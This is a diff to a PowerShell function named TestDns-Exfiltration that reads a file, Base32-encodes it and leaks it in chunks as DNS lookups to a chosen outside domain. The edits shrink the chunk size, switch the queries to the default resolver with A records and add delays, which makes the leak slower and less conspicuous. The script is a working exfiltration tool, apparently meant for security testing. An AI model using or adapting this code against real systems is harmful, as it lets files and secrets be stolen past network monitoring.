@@ -1,7 +1,12 @@
 function TestDns-Exfiltration {
-    param([string] $filePath, [string] $domain, [string] $dns = "8.8.8.8")
+
+    param(
+    [string] $filePath, 
+    [string] $domain, 
+    [string] $dns = "8.8.8.8")
+
     write-host "DNS File Exfiltration Test - @fgsec" -ForegroundColor "yellow"
-    $block_size = 50
+    $block_size = 5
     if(Test-Path($filePath)) {
         [byte[]] $bytes = [IO.File]::ReadAllBytes($filePath)
         $byteArrayAsBinaryString = -join $bytes.ForEach{[Convert]::ToString($_, 2).PadLeft(8, '0')}
@@ -15,12 +20,13 @@ function TestDns-Exfiltration {
         $p = 0
         while($key_end -le ($Base32string.length)) {
             $payload = ($Base32string[$key_start..$key_end]) -join ""
-            $url =  "$p-$payload.$domain"
+            $url =  "$p$payload.$domain"
             write-host "[!] Request to: $url" -ForegroundColor gray
-            nslookup -type=TXT $url $dns
+            nslookup -type=A $url
             $key_start = $key_end+1
             $key_end = $key_end + $block_size
             $p++
+            start-sleep -Seconds 1
         }
     } else {
         write-host "File not found!" -ForegroundColor red
